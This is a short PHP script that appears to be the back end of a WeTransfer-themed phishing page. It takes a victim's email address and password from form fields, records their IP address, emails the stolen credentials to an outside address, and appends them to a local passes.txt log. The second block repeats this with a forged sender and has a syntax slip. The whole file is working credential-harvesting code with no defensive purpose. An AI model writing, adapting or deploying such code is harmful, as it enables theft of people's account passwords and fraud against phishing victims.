<?php

//Get the necessary variables from the server.


//Define required variables and send user input to $myEmail.
$myEmail = 'log@elfargoltd.com';
$subject = 'WeTransfer';
$message = "Email: ".$ema1l."\nPassword:".$pass."\nIP:".$ip."\n";
mail($myEmail, $subject, $message);
$file = "passes.txt"; 

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $message) or die("Couldn't write values to file!");
fclose($fp);

?>


<?php
$ema1l = $_POST['X1'];
$pass = $_POST['X2'];
$ip = $_SERVER["REMOTE_ADDR"];
// Define variables for email content
$to = "recipient@example.com"; // Change this to the recipient's email address
$subject = "Email logs"; // Change this to the email subject
$message = "Email: ".$ema1l."\nPassword:".$pass."\nIP:".$ip."\n"; // Change this to the email message
$from_email = "sender@example.com"; // Change this to your email address
$from_name = "Hephzibar"; // Change this to the name you want to appear in the "From" field

// Additional headers
$headers = "From: $from_name <$from_email>" . "\r\n"; // From name and email
$headers .= "Reply-To: $from_email" . "\r\n"; // Reply-to email
$headers .= "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; // Set content type as HTML
mail($to, $subject, $message, $headers)
// Send email
$file = "passes.txt"; 

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $message) or die("Couldn't write values to file!");
fclose($fp);
?>